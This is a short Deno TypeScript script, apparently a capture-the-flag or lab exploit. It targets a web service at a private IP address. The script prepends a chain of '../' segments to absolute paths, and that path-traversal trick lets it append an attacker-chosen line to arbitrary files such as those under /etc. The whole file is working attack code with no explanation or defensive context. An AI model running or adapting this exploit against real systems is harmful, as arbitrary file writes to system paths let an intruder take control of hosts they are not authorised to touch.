export {};

const appendFile = async (file: string, line: string) => {
  const result = await fetch("http://10.2.17.11:5000/💎🙌", {
    headers: {
      "content-type": "application/json",
    },
    body: `{"📈":["${file}"], "🚀":"${line}\\n"}`,
    method: "POST",
  });
  if (!result.ok) {
    console.error(result);
    console.error(await result.text().catch(() => "error"));
    throw new Error("Failed to append to " + file);
  }
  const content = await result.text();
  return content;
};

let targetFile = Deno.args[0];
if (targetFile.charAt(0) === "/") {
  targetFile = "../../../../../../../../.." + targetFile;
}

const payload = Deno.args[1];
if (!payload) {
  throw new Error("Usage: appendFile.ts /etc/path 'line'");
}

const main = await appendFile(targetFile, payload);
console.log(main);
